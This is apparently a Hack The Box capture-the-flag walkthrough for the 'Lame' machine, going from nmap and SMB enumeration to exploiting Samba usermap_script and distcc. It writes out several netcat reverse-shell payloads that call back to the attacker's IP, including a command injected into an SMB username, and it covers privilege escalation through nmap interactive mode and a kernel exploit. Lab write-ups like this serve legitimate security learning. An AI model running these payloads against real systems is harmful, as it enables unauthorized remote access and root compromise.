# Lame HTB, IP address: 10.10.10.3

## Initial Enumeration 
 
 1. **nmap -sC -sV 10.10.10.3** 
 
![lame1](https://user-images.githubusercontent.com/15195048/93899974-bab02500-fca9-11ea-87c0-4ab4a045c096.png)
----------------------------------------------------------------------------------------------------------------------------------------------
## Port Enumeration

## 1.Enumerating FTP

vulnerable vsftpd 2.3.4, anonymous login allowed
According to nmap script the ftp service is not vulnerable so the version would possibly be a banner.
However, we will try metasploit in order to exploit this vulnerability.

**Metasploit**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo msfdb start
msfconsole
>search vsftpd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Yes, indeed this is a banner so it wont work!!

## 2.Enumerating SMB on port 139 & 445

**1.enum4linux -a 10.10.10.3**


**2.smbclient -L \\10.10.10.3**
 error NT_STATUS_CONNECTION_DISCONNECTED
 
  SMBClient generating an error: protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
  Samba has turned off default SMBv1 support as of September of last year.
  
**--option='client min protocol=NT1'**

**smbclient //10.10.10.x/ --option='client min protocol=NT1'**

Go to ur /etc/samba/smb.conf under the [global] section:
client min protocol = NT1
That allows smbclient to work against SMBv1 shares.

**3.smbmap -H 10.10.10.3**
 
 

#Privilege Escalation no1

# A)Metasploit
Metasploit
msf5 > search samba 3.0.20
use exploit/multi/samba/usermap_script

**Rooted**

# B)Manually exploit SMB

smbclient 10.10.10.3/tmp
smb>logon "/=`nohup nc -nv 10.10.14.4 4444 -e /bin/sh`"


**Attacker:** 
nc -lvpn 4444

**Rooted**

# Samba exploit script written in Python
If you find an exploit written in Python you could modify the variables, or you can run line by line yourself.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$pythonn
>>> payload = '
>>> from smb.SMBConnection import SMBConnection
>>> payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 9999 >/tmp/f' Attacker IP and port
>>> username = "/=`nohup " + payload + "`"
>>> connection = SMBConnection(username, "", "", "")
>>> connection.connect("10.10.10.3",445)  Victim IP and port
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


**Attacker:**
nc -lnvp 9999

**Rooted**
-----------------------------------------------------------------------------------------------------------------------------------
# Privilege Escalation no2
Enumerating port 3621 (distccd)
 
 
 
Metasploit module:
searchsploit -m exploits/multiple/remote/9915.rb

Let’s see if a non-metasploit one is on the internet:

NMAP Script
ls -la /usr/share/nmap/scripts/*distcc*
/usr/share/nmap/scripts/distcc-cve2004-2687.nse


**nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 10.10.14.X 9999'" 10.10.10.3 -Pn**

**Attacker:**
$ nc -lnvp 9999

# A)GTFobins nmap


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2$ id
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# B)Kernel Exploit
Kernel Exploit
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

Search kernel exploits: 8572.c

Send with python server the exploit and get it from the victim machine
gcc -o exp 8572.c #compile it and run it

**UDEV Modern Linux distributions** are capable of identifying a hardware component which is plugged into an already-running system. There are a lot of user-friendly distributions like Ubuntu, which will automatically run specific applications like Rhythmbox when a portable device like an iPod is plugged into the system.

*Netlink is used to transfer information between the kernel and user- space processes.*
